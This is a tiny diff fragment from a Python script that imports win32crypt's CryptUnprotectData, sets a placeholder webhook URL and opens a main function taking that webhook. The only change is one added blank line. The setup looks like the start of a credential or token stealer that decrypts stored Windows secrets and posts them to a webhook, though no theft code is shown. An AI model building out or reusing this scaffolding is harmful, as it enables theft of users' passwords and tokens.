@@ -22,6 +22,7 @@ from win32crypt import CryptUnprotectData
 
 WEBHOOK_URL = "&WEBHOOK_URL&"
 
+
 def main(webhook_url):
     global webhook, embed
     
